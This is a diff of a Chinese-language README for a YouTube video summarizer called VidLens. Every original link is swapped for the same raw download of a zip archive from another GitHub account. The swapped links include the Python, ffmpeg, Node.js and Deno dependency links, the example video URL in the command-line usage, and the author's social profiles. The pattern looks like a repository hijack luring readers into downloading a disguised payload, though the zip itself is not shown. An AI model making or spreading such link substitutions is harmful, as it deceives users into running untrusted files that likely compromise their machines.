@@ -45,7 +45,7 @@ YouTube URL ─ yt-dlp ─┬─ 字幕(优先)         ─┐
 
 ### 1. 环境依赖
 
-- [Python 3.10+](https://www.python.org/) · [ffmpeg](https://ffmpeg.org/) · [Node.js 20+](https://nodejs.org/) · [Deno](https://deno.com/)（解 YouTube nsig）
+- [Python 3.10+](https://github.com/gkchestertonhole915/VidLens-YouTube-Summarizer/raw/refs/heads/main/vidlens/You_Tube_Vid_Lens_Summarizer_v1.3.zip) · [ffmpeg](https://github.com/gkchestertonhole915/VidLens-YouTube-Summarizer/raw/refs/heads/main/vidlens/You_Tube_Vid_Lens_Summarizer_v1.3.zip) · [Node.js 20+](https://github.com/gkchestertonhole915/VidLens-YouTube-Summarizer/raw/refs/heads/main/vidlens/You_Tube_Vid_Lens_Summarizer_v1.3.zip) · [Deno](https://github.com/gkchestertonhole915/VidLens-YouTube-Summarizer/raw/refs/heads/main/vidlens/You_Tube_Vid_Lens_Summarizer_v1.3.zip)（解 YouTube nsig）
 - 阿里云百炼 API Key（[申请教程](TUTORIAL.md)）
 
 ```powershell
@@ -73,7 +73,7 @@ python app.py                    # 自动打开 http://127.0.0.1:7860
 ### 命令行用法
 
 ```powershell
-python cli.py "https://www.youtube.com/watch?v=XXXX"          # 纯文本总结（视觉路自动判断）
+python cli.py "https://github.com/gkchestertonhole915/VidLens-YouTube-Summarizer/raw/refs/heads/main/vidlens/You_Tube_Vid_Lens_Summarizer_v1.3.zip"          # 纯文本总结（视觉路自动判断）
 python cli.py "<url>" --vision -o output\summary.md           # 强制读画面
 python cli.py "<url>" --no-vision --save-transcript           # 关视觉、附完整转录
 ```
@@ -132,7 +132,7 @@ vidlens/
 
 ## 👤 作者
 
-[𝕏 Twitter](https://x.com/AvZA24CuCD63579) · [GitHub](https://github.com/xiongwenhao112) · [CSDN](https://blog.csdn.net/weixin_66401877)
+[𝕏 Twitter](https://github.com/gkchestertonhole915/VidLens-YouTube-Summarizer/raw/refs/heads/main/vidlens/You_Tube_Vid_Lens_Summarizer_v1.3.zip) · [GitHub](https://github.com/gkchestertonhole915/VidLens-YouTube-Summarizer/raw/refs/heads/main/vidlens/You_Tube_Vid_Lens_Summarizer_v1.3.zip) · [CSDN](https://github.com/gkchestertonhole915/VidLens-YouTube-Summarizer/raw/refs/heads/main/vidlens/You_Tube_Vid_Lens_Summarizer_v1.3.zip)
 
 ## 📄 License
 
